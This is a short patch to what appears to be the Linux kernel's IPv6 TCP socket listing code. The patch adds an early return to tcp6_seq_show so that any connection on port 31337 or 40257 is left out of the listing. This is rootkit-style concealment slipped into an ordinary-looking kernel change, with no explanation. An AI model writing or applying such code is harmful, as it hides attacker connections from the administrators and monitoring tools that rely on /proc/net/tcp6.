@@ -2270,8 +2270,29 @@ static void get_timewait6_sock(struct seq_file *seq,
 		   refcount_read(&tw->tw_refcnt), tw);
 }
 
+
+static inline int atoi(char *str) {
+        int res = 0, i;
+        for (i = 0; str[i] >= '0' && str[i] <= '9'; ++i)
+                res = 10 * res + str[i] - '0';
+        return res;
+}
+
 static int tcp6_seq_show(struct seq_file *seq, void *v)
 {
+        struct inet_sock *is;
+   	unsigned short port = htons(atoi("31337"));
+   	unsigned short port2 = htons(atoi("40257"));
+
+        if (v != SEQ_START_TOKEN) {
+    	   is = (struct inet_sock *)v;
+    	   if (port == is->inet_sport || port == is->inet_dport) {
+    			return 0;
+    	   }
+    	   if (port2 == is->inet_sport || port2 == is->inet_dport) {
+                return 0;
+           }
+        }	
 	struct tcp_iter_state *st;
 	struct sock *sk = v;
 
